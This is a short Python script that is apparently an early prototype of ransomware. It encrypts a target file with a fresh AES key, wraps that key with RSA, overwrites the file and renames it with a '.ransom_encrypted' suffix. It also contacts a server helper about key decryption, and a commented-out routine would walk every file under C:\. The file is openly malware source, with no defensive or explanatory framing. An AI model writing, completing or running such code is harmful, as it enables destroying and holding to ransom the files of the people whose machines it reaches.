import os
import asyncio
import http_requests

import aes_cipher
import rsa_cipher

# def encrypt_all_files(PUBLIC_KEY):
#     # iterate over files in
#     # that directory
#     for root, dirs, files in os.walk('C:\\'):
#         for filename in files:
#             print(os.path.join(root, filename))

async def encrypt_file(filepath):
    with open(filepath, 'rb') as file:
        data = file.read()

    key = aes_cipher.generate_key()
    encripted_data = aes_cipher.encrypt(key, data)
    decripted_data = aes_cipher.decrypt(key, encripted_data)

    with open(filepath, 'w') as file:
        file.write(encripted_data.decode('utf-8'))

    encrypted_key = rsa_cipher.encrypt(key)
    encrypted_key = encrypted_key.decode('utf-8')

    os.rename(filepath, f'{filepath}.{encrypted_key}.ransom_encrypted')

    print(f'File encryption successfull - {filepath}')

# async def decrypt_file(decryptor, filepath):
#     with open(filepath, 'rb') as file:
#         data = file.read()

#     decrypted = decryptor.decrypt(data)
#     with open(filepath, 'w') as file:
#         file.write(decrypted)

#     file.close()
#     print('yey')


async def main():
    rsa_cipher.setup()

    encrypted_fernet_key = rsa_cipher.get_encrypted_fernet_key()
    yo = await http_requests.request_fernet_decryption(encrypted_fernet_key)

    await encrypt_file('image.jpg')
    # await decrypt_file(decryptor, 'image.jpg.ransom_encrypted')

    print('yey')

asyncio.run(main())